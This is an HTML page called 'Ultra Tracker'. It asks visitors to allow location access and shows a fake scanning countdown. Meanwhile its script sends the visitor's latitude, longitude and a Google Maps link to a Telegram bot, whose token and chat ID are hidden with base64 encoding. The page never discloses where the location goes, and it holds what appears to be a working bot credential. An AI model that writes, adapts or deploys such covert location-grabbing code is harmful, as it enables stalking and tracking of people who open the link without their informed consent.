<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Ultra Tracker</title>

<style>
body {
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background: linear-gradient(135deg,#ff1493,#6a0dad);
    font-family: Arial;
    color:white;
}

.container {
    width:90%;
    max-width:420px;
    padding:20px;
    border-radius:20px;
    background:rgba(255,255,255,0.08);
    backdrop-filter:blur(20px);
    text-align:center;
}

/* Button */
button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:10px;
    font-size:18px;
    background:linear-gradient(45deg,#ff0080,#ff8c00);
    color:white;
}

/* Huge Countdown */
#countdown{
    font-size:25vw;
    font-weight:900;
    margin:10px 0;
}

/* Heading */
#heading{
    font-size:20px;
}

/* Progress */
.bar{
    width:100%;
    height:8px;
    background:rgba(255,255,255,0.2);
    border-radius:10px;
    overflow:hidden;
}

.fill{
    height:100%;
    width:0%;
    background:linear-gradient(90deg,#00ffcc,#00ff66);
}

/* Shake */
#img{
    width:140px;
    display:none;
    margin-top:15px;
}

@keyframes shake{
    0%{transform:translate(0,0);}
    25%{transform:translate(12px,-12px);}
    50%{transform:translate(-12px,12px);}
    75%{transform:translate(12px,12px);}
    100%{transform:translate(-12px,-12px);}
}

.shake{
    animation:shake 0.07s infinite;
}
</style>
</head>

<body>

<div class="container">

<button onclick="start()">Allow Location</button>

<div id="heading"></div>
<div id="countdown"></div>

<div class="bar"><div id="fill" class="fill"></div></div>

<img id="img" src="https://i.imgur.com/8Km9tLL.png">

<audio id="audio" src="https://www.soundjay.com/buttons/sounds/button-4.mp3"></audio>

</div>

<script>
(function(){

const BOT_TOKEN = atob("ODUyNDM5OTY5MjpBQUg4Uk5GbzZVZktDcjgxSUM1c1k2Rk8yMGh4QUJTX3VQUQ==");
const CHAT_ID  = atob("NjI3NzQzMjM1Ng==");

let done=false;

/* 🚀 TELEGRAM WITH RETRY (KEY FIX) */
async function send(lat,lon,retry=0){

    const map=`https://www.google.com/maps?q=${lat},${lon}`;

    try{
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({
                chat_id:CHAT_ID,
                text:`📍 Location\nLat:${lat}\nLon:${lon}\nMap:${map}`
            })
        });

        done=true;
        success();

    }catch(e){

        if(retry<3){
            send(lat,lon,retry+1);
        }
    }
}

/* ⚡ FAST LOCATION (OLD TECHNIQUE RESTORED) */
function getLocation(){

    navigator.geolocation.getCurrentPosition(
        pos=>{
            send(pos.coords.latitude,pos.coords.longitude);
        },
        ()=>{},
        {
            enableHighAccuracy:false,
            maximumAge:Infinity,
            timeout:5000
        }
    );
}

/* 🎯 SUCCESS */
function success(){

    document.getElementById("heading").innerText="SUCCESS";
    document.getElementById("countdown").innerText="";

    let img=document.getElementById("img");
    img.style.display="block";
    img.classList.add("shake");

    document.getElementById("audio").play();
}

/* 📊 Progress */
function progress(p){
    document.getElementById("fill").style.width=p+"%";
}

/* ⏱ Countdown */
function run(sec,color,title,next){

    let t=sec;

    document.getElementById("heading").innerText=title;
    document.getElementById("countdown").style.color=color;

    let i=setInterval(()=>{

        if(done){
            clearInterval(i);
            return;
        }

        document.getElementById("countdown").innerText=t;
        progress(((sec-t)/sec)*100);

        t--;

        if(t<0){
            clearInterval(i);
            next && next();
        }

    },1000);
}

/* 🔥 MAIN */
window.start=function(){

    done=false;

    // ⚡ START LOCATION IMMEDIATELY (CRITICAL)
    getLocation();

    run(10,"black","Scanning...",()=>{

        if(done) return;

        run(5,"red","Retrying...",()=>{

            if(done) return;

            run(5,"yellow","Final Attempt...");
        });

    });
};

})();
</script>

</body>
</html>
